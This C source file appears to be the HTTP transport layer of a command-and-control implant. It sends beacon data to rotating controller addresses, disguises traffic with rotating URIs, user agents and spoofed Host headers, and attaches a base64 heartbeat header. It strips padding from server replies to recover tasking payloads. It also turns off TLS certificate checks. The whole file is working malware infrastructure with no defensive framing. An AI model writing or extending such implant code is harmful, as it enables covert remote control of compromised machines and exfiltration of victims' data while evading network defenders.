//
// Created by seba on 10/17/26.
//

#include "net_http.h"
#include "crypt.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <curl/curl.h>
#include <openssl/evp.h>

struct HttpCtx {
    CURL              *curl;
    const Profile     *prof;
    char              *beat_header;
    struct curl_slist *base_headers;

    size_t  server_index;
    size_t  uri_index;
    size_t  ua_index;
    size_t  hh_index;

    uint8_t *resp_buf;
    size_t   resp_len;
    size_t   resp_cap;
};

static size_t write_cb(void *data, size_t size, size_t nmemb, void *userp) {
    HttpCtx *ctx = (HttpCtx *)userp;
    size_t total = size * nmemb;
    if (ctx->resp_len + total > ctx->resp_cap) {
        size_t newcap = (ctx->resp_cap == 0) ? 4096 : ctx->resp_cap;
        while (newcap < ctx->resp_len + total) newcap *= 2;
        ctx->resp_buf = realloc(ctx->resp_buf, newcap);
        ctx->resp_cap = newcap;
    }
    memcpy(ctx->resp_buf + ctx->resp_len, data, total);
    ctx->resp_len += total;
    return total;
}

HttpCtx *http_init(void) {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    HttpCtx *ctx = calloc(1, sizeof(HttpCtx));
    ctx->curl = curl_easy_init();
    return ctx;
}

int http_set_profile(HttpCtx *ctx, const Profile *prof, const uint8_t *beat_val, size_t beat_len) {
    ctx->prof = prof;

    int b64_len = 4 * ((int)beat_len + 2) / 3;
    char *b64 = calloc(1, (size_t)b64_len + 1);
    EVP_EncodeBlock((unsigned char *)b64, beat_val, (int)beat_len);

    size_t hdr_name_len = strlen(prof->hb_header);
    ctx->beat_header = malloc(hdr_name_len + 2 + (size_t)b64_len + 1);
    sprintf(ctx->beat_header, "%s: %s", prof->hb_header, b64);
    free(b64);

    ctx->base_headers = NULL;
    if (prof->request_headers && prof->request_headers[0]) {
        char *copy = strdup(prof->request_headers);
        char *line = strtok(copy, "\r\n");
        while (line) {
            if (line[0]) ctx->base_headers = curl_slist_append(ctx->base_headers, line);
            line = strtok(NULL, "\r\n");
        }
        free(copy);
    }

    return 0;
}

static void rotate_indices(HttpCtx *ctx) {
    const Profile *p = ctx->prof;
    if (p->rotation_mode == 1) {
        uint8_t rnd[4];
        crypt_random(rnd, 4);
        uint32_t r = ((uint32_t)rnd[0] << 24) | ((uint32_t)rnd[1] << 16)
                   | ((uint32_t)rnd[2] << 8)  | rnd[3];
        if (p->uri_count > 0) ctx->uri_index = r % p->uri_count;
        if (p->ua_count > 0)  ctx->ua_index  = (r >> 8) % p->ua_count;
        if (p->addr_count > 0) ctx->server_index = (r >> 16) % p->addr_count;
        if (p->hh_count > 0) ctx->hh_index = (r >> 4) % p->hh_count;
    } else {
        if (p->uri_count > 0) ctx->uri_index = (ctx->uri_index + 1) % p->uri_count;
        if (p->ua_count > 0)  ctx->ua_index  = (ctx->ua_index + 1)  % p->ua_count;
        if (p->addr_count > 0) ctx->server_index = (ctx->server_index + 1) % p->addr_count;
        if (p->hh_count > 0) ctx->hh_index = (ctx->hh_index + 1) % p->hh_count;
    }
}

int http_exchange(HttpCtx *ctx, const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    *out = NULL;
    *out_len = 0;

    const Profile *p = ctx->prof;
    int connected = 0;

    for (size_t attempt = 0; attempt < p->addr_count && !connected; attempt++) {
        size_t si = (ctx->server_index + attempt) % p->addr_count;
        const char *addr = p->addresses[si];

        char url[1024];
        const char *scheme = p->use_ssl ? "https" : "http";
        const char *uri = (p->uri_count > 0) ? p->uris[ctx->uri_index] : "/";
        snprintf(url, sizeof(url), "%s://%s%s", scheme, addr, uri);

        curl_easy_reset(ctx->curl);

        struct curl_slist *headers = NULL;
        for (struct curl_slist *h = ctx->base_headers; h; h = h->next)
            headers = curl_slist_append(headers, h->data);
        headers = curl_slist_append(headers, ctx->beat_header);

        if (p->ua_count > 0) {
            char ua_hdr[512];
            snprintf(ua_hdr, sizeof(ua_hdr), "User-Agent: %s", p->user_agents[ctx->ua_index]);
            headers = curl_slist_append(headers, ua_hdr);
        }

        if (p->hh_count > 0) {
            char host_hdr[512];
            snprintf(host_hdr, sizeof(host_hdr), "Host: %s", p->host_headers[ctx->hh_index]);
            headers = curl_slist_append(headers, host_hdr);
        }

        curl_easy_setopt(ctx->curl, CURLOPT_URL, url);
        curl_easy_setopt(ctx->curl, CURLOPT_HTTPHEADER, headers);

        if (p->http_method && strcasecmp(p->http_method, "GET") == 0) {
            curl_easy_setopt(ctx->curl, CURLOPT_HTTPGET, 1L);
        } else {
            curl_easy_setopt(ctx->curl, CURLOPT_POST, 1L);
            if (data && data_len > 0) {
                curl_easy_setopt(ctx->curl, CURLOPT_POSTFIELDSIZE, (long)data_len);
                curl_easy_setopt(ctx->curl, CURLOPT_POSTFIELDS, data);
            } else {
                curl_easy_setopt(ctx->curl, CURLOPT_POSTFIELDSIZE, 0L);
                curl_easy_setopt(ctx->curl, CURLOPT_POSTFIELDS, "");
            }
        }

        curl_easy_setopt(ctx->curl, CURLOPT_WRITEFUNCTION, write_cb);
        curl_easy_setopt(ctx->curl, CURLOPT_WRITEDATA, ctx);
        curl_easy_setopt(ctx->curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(ctx->curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(ctx->curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(ctx->curl, CURLOPT_CONNECTTIMEOUT, 10L);

        ctx->resp_len = 0;

        CURLcode res = curl_easy_perform(ctx->curl);
        curl_slist_free_all(headers);

        if (res != CURLE_OK) {
            DBG("curl(%s): %s\n", url, curl_easy_strerror(res));
            continue;
        }

        long http_code = 0;
        curl_easy_getinfo(ctx->curl, CURLINFO_RESPONSE_CODE, &http_code);
        if (http_code != 200) {
            DBG("http %ld from %s\n", http_code, url);
            ctx->resp_len = 0;
            continue;
        }

        connected = 1;
        ctx->server_index = si;
    }

    rotate_indices(ctx);

    if (!connected) {
        DBG("all servers unreachable\n");
        return -1;
    }

    if (ctx->resp_len == 0 || ctx->resp_len <= p->ans_size) {
        DBG("empty response (len=%zu ans_size=%u)\n", ctx->resp_len, p->ans_size);
        return 0;
    }

    size_t payload_len = ctx->resp_len - p->ans_size;
    uint8_t *payload = ctx->resp_buf + p->ans_pre_size;

    uint8_t *copy = malloc(payload_len);
    if (!copy) return 0;
    memcpy(copy, payload, payload_len);

    *out = copy;
    *out_len = payload_len;
    return 0;
}

void http_free(HttpCtx *ctx) {
    if (!ctx) return;
    if (ctx->curl) curl_easy_cleanup(ctx->curl);
    curl_slist_free_all(ctx->base_headers);
    free(ctx->beat_header);
    free(ctx->resp_buf);
    free(ctx);
    curl_global_cleanup();
}
